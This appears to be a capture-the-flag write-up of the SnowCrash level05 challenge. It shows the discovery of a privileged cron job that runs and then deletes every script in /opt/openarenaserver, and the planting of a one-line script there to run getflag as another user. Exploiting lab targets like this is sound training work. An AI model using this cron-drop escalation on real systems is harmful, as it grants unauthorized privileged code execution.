On login, there is a message that says:
"You have new mail."

When we search the mail, we find:

level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

We find openarenaserver:

level05@SnowCrash:~$ find / -user 3005 2>/dev/null
> /usr/sbin/openarenaserver
> /rofs/usr/sbin/openarenaserver

------
Which is a script.

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

The one in /usr/sbin is inaccessible 
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver
cat: /rofs/usr/sbin/openarenaserver: Permission denied

------

level05@SnowCrash:~$ find / -user 2005 2>/dev/null
Which only returns the content of the /proc/ folder

------

openarena: https://doc.ubuntu-fr.org/openarena

----


bash -x = run script in debug mode 
ACLs chapitre 16

https://www.linuxquestions.org/linux/answers/security/acls_extended_filepermissions

https://github.com/opsxcq/exploit-CVE-2014-6271

--------------

The mail is a cron job, meaning the script gets run every 2 minutes (with privileges)
The script in itself take every script in /opt/openarenaserver, execute them and then delete them.

So, we just create this script:
echo "`echo $(getflag) > /tmp/flag`"

And wait for the flag to appear in /tmp/flag
